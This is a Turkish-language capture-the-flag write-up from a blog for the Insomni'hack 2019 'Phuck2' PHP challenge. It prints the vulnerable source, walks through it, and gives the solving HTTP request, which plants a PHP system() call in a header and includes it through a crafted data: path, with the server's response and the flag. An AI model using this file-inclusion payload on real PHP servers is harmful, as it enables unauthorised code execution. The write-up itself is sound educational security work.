<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Phuck2 – Insomni’hack 2019 | anal.school</title><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Phuck2 – Insomni’hack 2019 | anal.school"><meta name="twitter:description" content="bir çeşit ilim evi"><meta name="twitter:image" content="https://anal.school/img/twit-banner.webp"><script async src="https://www.googletagmanager.com/gtag/js?id=UA-118381182-2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-118381182-2');</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
 font-display: swap;
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 font-display: swap;
}</style><meta name="generator" content="Hexo 5.2.0"></head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/about/">About</a></nav></header><main><article><div id="post-bg"><div id="post-title"><div id="post-info"><span>date:<time datetime="2019-01-20T20:23:26.000Z" id="date"> 2019-01-20</time></span><br><span>updated:<time datetime="2020-12-08T12:07:45.373Z" id="updated"> 2020-12-08</time></span></div><h1>Phuck2 – Insomni’hack 2019</h1><hr></div><div id="post-content"><p>Another year, another PH(P)uck. Have fun with that !</p>
<p><a target="_blank" rel="noopener" href="http://phuck.teaser.insomnihack.ch/?hl=1">http://phuck.teaser.insomnihack.ch/?hl=1</a></p>
<p><a target="_blank" rel="noopener" href="http://phuck.teaser.insomnihack.ch/phpinfo.php">http://phuck.teaser.insomnihack.ch/phpinfo.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    stream_wrapper_unregister(<span class="hljs-string">&#x27;php&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hl&#x27;</span>])) highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-variable">$mkdir</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>) </span>&#123;<br>        system(<span class="hljs-string">&#x27;mkdir -- &#x27;</span>.escapeshellarg(<span class="hljs-variable">$dir</span>));<br>    &#125;;<br><br>    <span class="hljs-variable">$randFolder</span> = bin2hex(random_bytes(<span class="hljs-number">16</span>));<br>    <span class="hljs-variable">$mkdir</span>(<span class="hljs-string">&#x27;users/&#x27;</span>.<span class="hljs-variable">$randFolder</span>);<br>    chdir(<span class="hljs-string">&#x27;users/&#x27;</span>.<span class="hljs-variable">$randFolder</span>);<br><br>    <span class="hljs-variable">$userFolder</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-variable">$userFolder</span> = basename(str_replace([<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>],[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>],<span class="hljs-variable">$userFolder</span>));<br><br>    <span class="hljs-variable">$mkdir</span>(<span class="hljs-variable">$userFolder</span>);<br>    chdir(<span class="hljs-variable">$userFolder</span>);<br>    file_put_contents(<span class="hljs-string">&#x27;profile&#x27;</span>,print_r(<span class="hljs-variable">$_SERVER</span>,<span class="hljs-literal">true</span>));<br>    chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br><br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]=str_replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!stripos(file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;php&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br>    &#125;<br><br>    chdir(<span class="hljs-keyword">__DIR__</span>);<br>    system(<span class="hljs-string">&#x27;rm -rf users/&#x27;</span>.<span class="hljs-variable">$randFolder</span>);<br></code></pre></td></tr></table></figure>

<h1 id="Analiz"><a href="#Analiz" class="headerlink" title="Analiz"></a>Analiz</h1><h2 id="Kodun-analizi"><a href="#Kodun-analizi" class="headerlink" title="Kodun analizi"></a>Kodun analizi</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">stream_wrapper_unregister(<span class="hljs-string">&#x27;php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p><strong>php://</strong> wrapperını kayıtdışı ediyoruz.</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$mkdir</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>) </span>&#123;<br>    system(<span class="hljs-string">&#x27;mkdir -- &#x27;</span>.escapeshellarg(<span class="hljs-variable">$dir</span>));<br>&#125;;<br></code></pre></td></tr></table></figure>
<p><strong>escapeshellarg</strong> ifadesini geçemeyeceğimiz için bura ile uğraşmamıza gerek yok</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$randFolder</span> = bin2hex(random_bytes(<span class="hljs-number">16</span>));<br><span class="hljs-variable">$mkdir</span>(<span class="hljs-string">&#x27;users/&#x27;</span>.<span class="hljs-variable">$randFolder</span>);<br>chdir(<span class="hljs-string">&#x27;users/&#x27;</span>.<span class="hljs-variable">$randFolder</span>);<br></code></pre></td></tr></table></figure>
<p>Kullanıcıya özel random bir klasör oluşturup dizini değiştiriyor.</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$userFolder</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$userFolder</span> = basename(str_replace([<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>],[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>],<span class="hljs-variable">$userFolder</span>));<br></code></pre></td></tr></table></figure>
<p><strong>X-Forwarded-For</strong> headeri set edilmiş ise headerin değerini, edilmemiş ise kullanıncın(bizim) IP adresimizi <strong>$userFolder</strong> değişkenine atıyor.</p>
<p><strong>$userFolder</strong> değişkenindeki değerin varsa <strong>noktaları</strong>, <strong>tire</strong> ve <strong>boşluk</strong> karakterlerini -siliyor- ‘’ ile değiştiriyor. (“127.0.0 .1” -&gt; “127001” gibi)</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$mkdir</span>(<span class="hljs-variable">$userFolder</span>);<br>chdir(<span class="hljs-variable">$userFolder</span>);<br>file_put_contents(<span class="hljs-string">&#x27;profile&#x27;</span>,print_r(<span class="hljs-variable">$_SERVER</span>,<span class="hljs-literal">true</span>));<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p><strong>$userFolder</strong> değeri ile klasör açar ve o klasörün içine <strong>profile</strong> adlı dosyaya <a target="_blank" rel="noopener" href="http://php.net/manual/tr/reserved.variables.server.php"><strong>$_SERVER</strong> arrayinin</a> içeriğini yazar.</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]=str_replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(!stripos(file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;php&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br>&#125;<br><br>chdir(<span class="hljs-keyword">__DIR__</span>);<br>system(<span class="hljs-string">&#x27;rm -rf users/&#x27;</span>.<span class="hljs-variable">$randFolder</span>);<br></code></pre></td></tr></table></figure>
<p><strong>GET</strong> ile yolladığımız <strong>page</strong> değerindeki noktaları siliyor ve <strong>file_get_contents($page)</strong> ile açtığımız dosyanın içinde stripos ile  dosyanın içerisinde <strong>&lt;?</strong> veya <strong>php</strong> kelimelerinin geçip geçmediğini kontrol ediyor. </p>
<p>Daha sonra dosyayı siliyor</p>
<hr>
<h2 id="Phpinfo"><a href="#Phpinfo" class="headerlink" title="Phpinfo"></a>Phpinfo</h2><table>
<thead>
<tr>
<th align="center">Directive</th>
<th align="center">Local Value</th>
<th align="center">Master Value</th>
</tr>
</thead>
<tbody><tr>
<td align="center">allow_url_fopen</td>
<td align="center">On</td>
<td align="center">On</td>
</tr>
<tr>
<td align="center">allow_url_include</td>
<td align="center">Off</td>
<td align="center">Off</td>
</tr>
</tbody></table>
<p>Olduğunu görüyoruz bunun anlamı <strong>include</strong> içerisinde <strong>url</strong> ve bazı <strong>wrapperler</strong> çalışmayacak.</p>
<h2 id="Cozum"><a href="#Cozum" class="headerlink" title="Çözüm"></a>Çözüm</h2><hr>
<p><strong>data:,xx/profile</strong> diye veri yolladığımız zaman <strong>allow_url_fopen</strong> ve <strong>allow_url_include</strong>‘dan dolayı;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain"># --&gt; döndürdüğü(return) değerini ifade edecek<br>file_get_contents(&#39;data:,xx&#x2F;profile&#39;); --&gt; string &#39;xx&#x2F;profile&#39;<br>include(&#39;data:,xx&#x2F;profile&#39;);           --&gt; &#39;data:,xx&#x2F;profile&#39; adına sahip dosyasının içeriği<br></code></pre></td></tr></table></figure>
<p><strong>data</strong> wrapperi <strong>file_get_contents</strong>‘te çalışırken <strong>include</strong>‘ta çalışmadı.</p>
<p>yani;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET &#x2F;?page&#x3D;data:,xx&#x2F;profile HTTP&#x2F;1.1<br>X-Forwarded-For: data:,xx<br>Get-Flag: &lt;?php system(&#39;&#x2F;get_flag&#39;); ?&gt;<br>Host: phuck.teaser.insomnihack.ch<br><br><br>HTTP&#x2F;1.1 200 OK<br>Date: Sun, 20 Jan 2019 20:16:13 GMT<br>Server: Apache&#x2F;2.4.29 (Ubuntu)<br>Vary: User-Agent,Accept-Encoding<br>Content-Length: 1101<br>Content-Type: text&#x2F;html; charset&#x3D;UTF-8<br><br>Array<br>(<br>    [HTTP_X_FORWARDED_FOR] &#x3D;&gt; data:,xx<br>    [HTTP_GET_FLAG] &#x3D;&gt; INS&#123;PhP_UrL_Phuck3rY_h3h3!&#125;<br>    [HTTP_HOST] &#x3D;&gt; phuck.teaser.insomnihack.ch<br>    [PATH] &#x3D;&gt; &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin<br>    [SERVER_SIGNATURE] &#x3D;&gt; &lt;address&gt;Apache&#x2F;2.4.29 (Ubuntu) Server at phuck.teaser.insomnihack.ch Port 80&lt;&#x2F;address&gt;<br><br>    [SERVER_SOFTWARE] &#x3D;&gt; Apache&#x2F;2.4.29 (Ubuntu)<br>    [SERVER_NAME] &#x3D;&gt; phuck.teaser.insomnihack.ch<br>    [SERVER_ADDR] &#x3D;&gt; 172.17.0.2<br>    [SERVER_PORT] &#x3D;&gt; 80<br>    [REMOTE_ADDR] &#x3D;&gt; **CENSORED**<br>    [DOCUMENT_ROOT] &#x3D;&gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;<br>    [REQUEST_SCHEME] &#x3D;&gt; http<br>    [CONTEXT_PREFIX] &#x3D;&gt; <br>    [CONTEXT_DOCUMENT_ROOT] &#x3D;&gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;<br>    [SERVER_ADMIN] &#x3D;&gt; [no address given]<br>    [SCRIPT_FILENAME] &#x3D;&gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php<br>    [REMOTE_PORT] &#x3D;&gt; 42696<br>    [GATEWAY_INTERFACE] &#x3D;&gt; CGI&#x2F;1.1<br>    [SERVER_PROTOCOL] &#x3D;&gt; HTTP&#x2F;1.1<br>    [REQUEST_METHOD] &#x3D;&gt; GET<br>    [QUERY_STRING] &#x3D;&gt; page&#x3D;data:,xx&#x2F;profile<br>    [REQUEST_URI] &#x3D;&gt; &#x2F;?page&#x3D;data:,xx&#x2F;profile<br>    [SCRIPT_NAME] &#x3D;&gt; &#x2F;index.php<br>    [PHP_SELF] &#x3D;&gt; &#x2F;index.php<br>    [REQUEST_TIME_FLOAT] &#x3D;&gt; 1548015373.641<br>    [REQUEST_TIME] &#x3D;&gt; 1548015373<br>)<br><br></code></pre></td></tr></table></figure>

<h2 id="Ve-flag-INS-PhP-UrL-Phuck3rY-h3h3"><a href="#Ve-flag-INS-PhP-UrL-Phuck3rY-h3h3" class="headerlink" title="Ve flag INS{PhP_UrL_Phuck3rY_h3h3!}"></a>Ve flag <strong>INS{PhP_UrL_Phuck3rY_h3h3!}</strong></h2><hr>
<h3 id="NOT-Soruyu-CTF-sirasinca-cozmus-olmayip-CTF-sornasi-IRC’den-verilen-bilgiler-Blaklis-tarafindan-yardimi-ile-yazilmistir"><a href="#NOT-Soruyu-CTF-sirasinca-cozmus-olmayip-CTF-sornasi-IRC’den-verilen-bilgiler-Blaklis-tarafindan-yardimi-ile-yazilmistir" class="headerlink" title="NOT: Soruyu CTF sırasınca çözmüş olmayıp, CTF sornası IRC’den verilen bilgiler (Blaklis tarafından) yardımı ile yazılmıştır"></a>NOT: Soruyu CTF sırasınca çözmüş olmayıp, CTF sornası IRC’den verilen bilgiler (<strong>Blaklis</strong> tarafından) yardımı ile yazılmıştır</h3><div id="paginator"></div></div><div id="post-footer"><hr><a href="/2019/04/28/JS-Safe-3-0-Google-CTF/">← Prev JS Safe 3.0 - Google CTF</a><span style="color: #fe2"> | </span><a href="/2018/07/23/MMORPG3000-CTFZone-2018/">MMORPG3000 - CTFZone 2018 Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/logo.webp" alt="Logo"></a><h1 id="Dr"><a href="/">anal kurs merkezi</a></h1></div><div id="aside-block"><h1>INDEX</h1><div id="post-index"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Analiz"><span class="toc-number">1.</span> <span class="toc-text">Analiz</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kodun-analizi"><span class="toc-number">1.1.</span> <span class="toc-text">Kodun analizi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phpinfo"><span class="toc-number">1.2.</span> <span class="toc-text">Phpinfo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cozum"><span class="toc-number">1.3.</span> <span class="toc-text">Çözüm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ve-flag-INS-PhP-UrL-Phuck3rY-h3h3"><span class="toc-number">1.4.</span> <span class="toc-text">Ve flag INS{PhP_UrL_Phuck3rY_h3h3!}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NOT-Soruyu-CTF-sirasinca-cozmus-olmayip-CTF-sornasi-IRC%E2%80%99den-verilen-bilgiler-Blaklis-tarafindan-yardimi-ile-yazilmistir"><span class="toc-number">1.4.1.</span> <span class="toc-text">NOT: Soruyu CTF sırasınca çözmüş olmayıp, CTF sornası IRC’den verilen bilgiler (Blaklis tarafından) yardımı ile yazılmıştır</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>